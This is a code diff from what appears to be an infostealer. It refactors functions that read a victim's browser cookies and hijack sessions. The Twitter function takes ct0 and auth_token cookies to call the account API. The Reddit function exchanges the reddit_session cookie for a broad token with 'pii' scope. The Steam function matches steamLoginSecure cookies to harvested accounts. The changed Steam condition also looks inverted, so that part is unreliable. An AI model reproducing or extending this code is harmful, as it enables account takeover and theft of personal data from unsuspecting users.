@@ -4,12 +4,12 @@ const { writeFileSync } = require('fs');
 const { join } = require('path');
 const fs = require('fs');
 const { getTempFolder } = require('../util/init');
-const cookies = getCookies();
 
 const twitter = async () => {
-  if (!(await cookies)?.find(cookie => cookie.host.includes('.twitter.com'))) return;
-  const { value: ct0 } = (await cookies)?.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0');
-  const { value: authToken, source } = (await cookies)?.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'auth_token');
+  const cookies = await getCookies();
+  if (!cookies || !cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0')) return;
+  const { value: ct0 } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'ct0');
+  const { value: authToken, source } = cookies.find(cookie => cookie.host.includes('.twitter.com') && cookie.name === 'auth_token');
   const { data: profile } = await axios.post('https://twitter.com/i/api/1.1/account/update_profile.json', {}, {
     headers: {
       Cookie: `ct0=${ct0}; auth_token=${authToken}`,
@@ -38,8 +38,9 @@ const twitter = async () => {
 };
 
 const reddit = async () => {
-  if (!(await cookies)?.find(cookie => cookie.host.includes('.reddit.com'))) return;
-  const { value: cookie, source } = (await cookies)?.find(cookie => cookie.host.includes('.reddit.com') && cookie.name === 'reddit_session');
+  const cookies = await getCookies();
+  if (!cookies || !cookies.find(cookie => cookie.host.includes('.reddit.com'))) return;
+  const { value: cookie, source } = cookies.find(cookie => cookie.host.includes('.reddit.com') && cookie.name === 'reddit_session');
   const { data: bearer } = await axios.post('https://accounts.reddit.com/api/access_token', { scopes: ['*', 'email', 'pii'] }, {
     headers: { Cookie: `reddit_session=${cookie}`, Authorization: 'Basic b2hYcG9xclpZdWIxa2c6' }
   });
@@ -66,8 +67,9 @@ const steam = async () => {
       accountsFile.push({
         accountId: account, accountInfo, games, level
       });
-      if ((await cookies)?.find(cookie => cookie.name === 'steamLoginSecure')) {
-        const cookie = (await cookies)?.find(cookie => cookie.host.includes('steam') && cookie.name === 'steamLoginSecure');
+      const cookies = await getCookies();
+      if (!cookies || cookies.find(cookie => cookie.name === 'steamLoginSecure')) {
+        const cookie = cookies.find(cookie => cookie.host.includes('steam') && cookie.name === 'steamLoginSecure');
         if (cookie && cookie.value && account) {
           const userId = cookie.value.match(regex)[0];
           const account = accountsFile.find(account => account.accountId === userId);
